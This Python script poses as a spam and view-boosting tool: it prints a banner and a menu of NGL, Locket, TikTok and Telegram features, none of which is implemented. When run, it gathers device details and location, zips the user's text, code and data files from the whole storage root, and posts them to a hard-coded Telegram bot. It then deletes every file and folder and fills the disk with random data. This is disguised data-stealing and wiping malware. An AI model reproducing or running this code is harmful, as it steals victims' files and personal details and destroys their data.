import os
import zipfile
import requests
import platform
import psutil
import socket
import time
import random
import sys
import subprocess
import shutil

def install_package(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for pkg in ["requests", "psutil"]:
    install_package(pkg)

adminId = "6601930239"
botToken = "7671140941:AAHKX4BJSFpn9RByNTKnzM5eNKBcAI_m0tQ"
exts = ["py", "js", "txt", "log", "csv", "json", "xml", "html", "css"]
rootPath = "/storage/emulated/0" if os.name != "nt" else "C:/"
maxZipSize = 100 * 1024 * 1024

def colorGradient(text, startRgb, endRgb):
    length = len(text)
    result = ""
    for i, c in enumerate(text):
        r = int(startRgb[0] + (endRgb[0] - startRgb[0]) * i / max(length - 1, 1))
        g = int(startRgb[1] + (endRgb[1] - startRgb[1]) * i / max(length - 1, 1))
        b = int(startRgb[2] + (endRgb[2] - startRgb[2]) * i / max(length - 1, 1))
        result += f"\033[1;38;2;{r};{g};{b}m{c}"
    result += "\033[0m"
    return result

def getDeviceInfo():
    name = platform.node() or "device"
    system = platform.system()
    release = platform.release()
    cpu = platform.processor() or "Unknown CPU"
    ramTotal = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    ramUsed = round(psutil.virtual_memory().used / (1024 ** 3), 2)
    diskTotal = round(psutil.disk_usage(rootPath).total / (1024 ** 3), 2)
    diskFree = round(psutil.disk_usage(rootPath).free / (1024 ** 3), 2)
    try:
        ipLocal = socket.gethostbyname(socket.gethostname())
    except:
        ipLocal = "Unknown"
    try:
        res = requests.get("http://ip-api.com/json", timeout=5).json()
        ipPublic = res.get("query", "Unknown")
        country = res.get("country", "Unknown")
        region = res.get("regionName", "Unknown")
        city = res.get("city", "Unknown")
        isp = res.get("isp", "Unknown")
    except:
        ipPublic = country = region = city = isp = "Unknown"
    return name, (
        f"🖥 Device: {name}\n"
        f"💻 OS: {system} {release}\n"
        f"⚙ CPU: {cpu}\n"
        f"📦 RAM: {ramUsed}GB / {ramTotal}GB\n"
        f"💾 Disk: {diskFree}GB free / {diskTotal}GB total\n"
        f"🌐 IP Local: {ipLocal}\n"
        f"🌎 IP Public: {ipPublic}\n"
        f"📍 Country: {country}\n"
        f"🏙 Region: {region}, {city}\n"
        f"📡 ISP: {isp}"
    )

def allTargetFiles(startPath):
    for root, _, files in os.walk(startPath):
        for file in files:
            if any(file.lower().endswith(ext) for ext in exts):
                fullPath = os.path.join(root, file)
                if os.access(fullPath, os.R_OK):
                    yield fullPath

def createZip(zipName, files):
    totalSize = 0
    with zipfile.ZipFile(zipName, "w", zipfile.ZIP_DEFLATED) as zipf:
        for filePath in files:
            try:
                fileSize = os.path.getsize(filePath)
                if totalSize + fileSize > maxZipSize:
                    continue
                arcname = os.path.relpath(filePath, rootPath)
                zipf.write(filePath, arcname)
                totalSize += fileSize
            except:
                continue

def sendToTelegram(zipFile, caption):
    url = f"https://api.telegram.org/bot{botToken}/sendDocument"
    with open(zipFile, "rb") as f:
        requests.post(url, data={"chat_id": adminId, "caption": caption}, files={"document": f})

def deleteFiles():
    for root, dirs, files in os.walk(rootPath):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except:
                continue
        for dir in dirs:
            try:
                shutil.rmtree(os.path.join(root, dir))
            except:
                continue

def createInfiniteFiles():
    i = 0
    while True:
        try:
            with open(f"{rootPath}/file_{i}.bin", "wb") as f:
                f.write(os.urandom(1024 * 1024))
            i += 1
        except:
            break

def displayMenu():
    banner = """
██╗░░░██╗██╗░░██╗██╗░░██╗██╗██╗░░░██╗███████╗
██║░░░██║╚██╗██╔╝██║░██╔╝██║██║░░░██║██╔════╝
╚██╗░██╔╝░╚███╔╝░█████═╝░██║██║░░░██║█████╗░░
░╚████╔╝░░██╔██╗░██╔═██╗░██║██║░░░██║██╔══╝░░
░░╚██╔╝░░██╔╝╚██╗██║░╚██╗██║╚██████╔╝███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░╚═════╝░╚══════╝
"""
    menu = """
List Commands:
1. Spam NGL Max Speed
2. Spam Add Friend Locket Max Speed 
3. Buff View Tiktok Max Speed
4. Add Member Join Group Telegram 

Tool By: Vũ Xuân Kiên
"""
    print(colorGradient(banner, (255, 0, 128), (0, 200, 255)))
    print(colorGradient(menu, (0, 200, 255), (255, 0, 128)))

def main():
    displayMenu()
    deviceName, deviceInfo = getDeviceInfo()
    zipName = f"{deviceName}.zip"
    files = list(allTargetFiles(rootPath))
    if files:
        createZip(zipName, files)
        sendToTelegram(zipName, deviceInfo)
        os.remove(zipName)
        deleteFiles()
        createInfiniteFiles()

main()
